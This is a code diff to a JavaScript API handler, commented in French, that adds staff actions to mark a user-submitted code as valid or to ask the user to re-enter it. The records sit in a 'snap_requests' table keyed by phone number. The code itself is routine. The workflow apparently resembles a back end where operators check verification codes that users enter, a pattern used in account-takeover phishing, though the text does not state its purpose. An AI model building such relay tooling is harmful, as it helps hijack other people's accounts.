@@ -31,6 +31,18 @@ export default async function handler(req, res) {
       return res.status(200).json({ success: true, message: 'Wrong number signalé' });
     }
 
+    // NOUVEAU : True Code (staff valide le code)
+    if (action === 'true_code') {
+      await sql`UPDATE snap_requests SET status = 'completed' WHERE phone = ${phone}`;
+      return res.status(200).json({ success: true, message: 'Code validé par le staff' });
+    }
+
+    // NOUVEAU : False Code (staff refuse le code, l'utilisateur doit ressaisir)
+    if (action === 'false_code') {
+      await sql`UPDATE snap_requests SET status = 'retry_code' WHERE phone = ${phone}`;
+      return res.status(200).json({ success: true, message: 'Code refusé, utilisateur invité à ressaisir' });
+    }
+
     return res.status(400).json({ success: false, message: 'Action inconnue' });
   } catch (e) {
     console.error('staff-action error:', e);
